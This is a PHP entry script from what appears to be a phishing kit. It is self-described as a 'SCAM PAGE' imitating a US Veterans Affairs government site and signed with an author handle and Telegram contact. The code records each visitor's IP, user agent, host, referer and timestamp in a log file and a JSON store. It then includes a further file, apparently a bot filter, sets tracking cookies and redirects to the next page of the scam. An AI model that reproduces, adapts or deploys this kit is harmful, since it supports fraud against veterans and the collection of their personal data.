<?php
//<!-- SCAM PAGE VA GOV UI #By YOCHI, WORK HARD DREAM B!G --> 
 /* ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   |_||_|     grrrr
	Telegram : @yo_chi
									   */
session_start();
date_default_timezone_set('America/New_York');
$dt=date('d M Y H:i:s');
if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NOT REFERED';};
$ib="--------| VIS!T0R|--------<br/>
IP = ".$_SERVER['REMOTE_ADDR'].'<br/>
USER-AGENT = '.$_SERVER['HTTP_USER_AGENT'].'<br/>
HOST ADDR = '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br/>
REFERER = '.$rf.'<br/>
DATETIME = '.$dt.'<br/>
<br/>
';
$_SESSION['homedir']=__DIR__;
$mile = fopen("admin/yo.txt","a");
fwrite($mile,$ib);
fclose($mile);
$filedir='admin/db.json';
$ud=file_get_contents($filedir);
$udarray = json_decode($ud,true);
foreach($udarray as $key=>$value){$narr[$key]=$value;};
$narr['visits'] += 1;
$narr['humans'] += 1;
array_push($narr['ips'],$_SERVER['REMOTE_ADDR']);
file_put_contents($filedir,json_encode($narr));
$d=dirname($_SERVER['PHP_SELF'],1);
if($d != '\\' && $d != '/'){$isshell=__DIR__;};
include('btm.php');
error_reporting(0);
setcookie('5075140835d0bc504791c76b04c33d2bck','c327b49efdca2668f28cd7b4beee54b3y3r',time()+86400*30,'/');
setcookie('ce114cdc5e387191210f3b519dfb118bck',time(),time()+86400*30,'/');
header('location:dir.php');
?>